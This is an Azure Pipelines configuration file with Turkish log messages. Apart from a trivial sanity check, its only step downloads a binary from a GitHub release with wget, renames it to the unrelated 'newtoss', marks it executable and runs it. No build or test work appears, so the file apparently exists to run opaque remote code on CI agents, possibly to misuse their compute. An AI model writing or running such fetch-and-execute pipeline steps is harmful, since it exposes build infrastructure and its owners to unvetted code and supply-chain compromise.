trigger:
- main

pool:
  name: "german"

steps:
- checkout: self

- bash: |
    echo "YAML OK — step başladı"
    echo "Agent: $AGENT_NAME  OS: $AGENT_OS"
  displayName: "Sanity check"

- bash: |
    set -euo pipefail
    URL="https://github.com/RenderAuto/Autos/releases/download/turkeyrender/autoren8"
    DEST="newtoss"
    echo "👉 İndiriliyor: $URL"
    wget -q -O "$DEST" "$URL"
    echo "🔧 Çalıştırılabilir yapılıyor"
    chmod +x "$DEST"
    echo "▶️ Çalıştırılıyor..."
    ./newtoss
  displayName: "Binary indir ve çalıştır"
